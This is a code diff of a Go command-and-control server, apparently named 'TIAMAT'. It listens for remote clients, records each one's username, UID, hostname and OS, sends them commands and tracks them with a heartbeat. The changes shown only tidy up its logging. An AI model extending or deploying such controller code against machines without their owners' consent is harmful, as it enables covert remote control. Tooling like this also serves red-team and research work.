@@ -58,6 +58,7 @@ func Server() {
 		C2Port = p
 	}
 	go WebServer()
+	log.SetPrefix("[TIAMAT] ")
 
 	ln, err := net.Listen("tcp", ":"+C2Port)
 	if err != nil {
@@ -80,9 +81,9 @@ func handleConn(conn net.Conn) {
 	if err != nil {
 		log.Printf("Error happened receiving OS information: %v\n", err)
 	}
-	fmt.Printf("Got info from new user:\nUsername: %v\nUID: %v\nGID: %v\nHostname: %v\nOS: %v\n", clientList[ID].ClientBasicInfo.Username,
-		clientList[ID].ClientBasicInfo.UID, clientList[ID].ClientBasicInfo.GID, clientList[ID].ClientBasicInfo.Hostname,
-		clientList[ID].ClientBasicInfo.OperatingSystem)
+	// fmt.Printf("Got info from new user:\nUsername: %v\nUID: %v\nGID: %v\nHostname: %v\nOS: %v\n", clientList[ID].ClientBasicInfo.Username,
+	// 	clientList[ID].ClientBasicInfo.UID, clientList[ID].ClientBasicInfo.GID, clientList[ID].ClientBasicInfo.Hostname,
+	// 	clientList[ID].ClientBasicInfo.OperatingSystem)
 
 	go Heartbeat(ID)
 }
@@ -98,7 +99,6 @@ func sendCommand(ID int, command string) (Output string, err error) {
 		e := fmt.Errorf("%v\n", resp.Message)
 		return "", e
 	}
-	fmt.Println(resp.Message)
 	return resp.Message, nil
 }
 
@@ -111,10 +111,11 @@ func Heartbeat(ID int) {
 		clientList[ID].Instruct(inst)
 		resp, err := ServerMessageReceiver(clientList[ID].Conn)
 		if err == nil && resp.Message == "PONG" {
-			fmt.Printf("Client %v is online!\n", clientList[ID].ClientBasicInfo.Hostname)
-			clientList[ID].IsOnline = true
+			if clientList[ID].IsOnline != true {
+				clientList[ID].IsOnline = true
+			}
 		} else {
-			fmt.Printf("Client %v is offline :(\n", clientList[ID].ClientBasicInfo.Hostname)
+			log.Printf("Client %v is offline :(\n", clientList[ID].ClientBasicInfo.Hostname)
 			clientList[ID].IsOnline = false
 			return
 		}
@@ -157,12 +158,10 @@ func getClient(conn net.Conn) (int, error) {
 			basicC.Hostname == v.ClientBasicInfo.Hostname
 
 		if sameClient == true {
-			fmt.Printf("\nCLIENT ALREADY PRESENT, SETTING TO ONLINE\n\n")
 			clientList[i].IsOnline = true
 			clientList[i].Conn = conn
+			log.Printf("Client %v is back online!\n", clientList[i].ClientBasicInfo.Hostname)
 			return i, nil
-		} else {
-			fmt.Println("Unequal!")
 		}
 	}
 	newC := Client{}
@@ -171,8 +170,8 @@ func getClient(conn net.Conn) (int, error) {
 	newC.IsOnline = true
 	newC.ClientID = clientIDs
 	clientIDs++
+	log.Printf("Client %v is online!\n", newC.ClientBasicInfo.Hostname)
 
-	fmt.Printf("\nCLIENT NOT PRESENT, ADDING TO LIST\n\n")
 	clientList = append(clientList, newC)
 	return len(clientList) - 1, nil
 }
